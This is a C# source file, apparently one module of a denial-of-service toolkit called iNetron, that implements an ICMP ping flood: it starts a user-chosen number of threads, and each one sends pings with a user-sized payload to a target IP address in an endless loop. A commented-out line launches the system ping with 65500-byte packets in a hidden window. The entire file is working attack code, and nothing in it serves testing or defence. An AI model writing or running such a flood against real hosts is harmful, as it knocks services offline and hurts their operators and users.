using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Threading;

namespace iNetron.Core.Methods.Vol
{
    /// <summary>
    /// Ping Flood. Oversized Ping Packets (probably won't work)
    /// </summary>
    public class icmp
    {
        private class sock
        {
            private string p_ip;
            private byte[] buf;

            public sock(string ip, int size)
            {
                p_ip = ip;
                buf = new byte[size];
            }
            // Sending a 'huge' (depends on user) ping.
            public void flood()
            {
                while (true)
                {
                    // var psi = new ProcessStartInfo("ping", p_ip + " -l 65500 -w -n 10"); psi.WindowStyle = ProcessWindowStyle.Hidden; Process.Start(psi);
                    try { new Ping().Send(p_ip, 1000, buf);  }
                    catch (Exception e) { Console.Error.WriteLine("ICMP Flood Send Fail " + e.ToString()); }
                }
            }
        }

        private string p_ip;
        private int p_sz;
        private int p_threads;
        public icmp(string ip, int size, int threads)
        {
            p_ip = ip;
            p_sz = size;
            p_threads = threads;
        }
        public void floodNow()
        {
            for (int i = 0; i < p_threads; ++i)
            {
                sock isock = new sock(p_ip, p_sz);
                new Thread(isock.flood).Start();
            }
        }
    }
}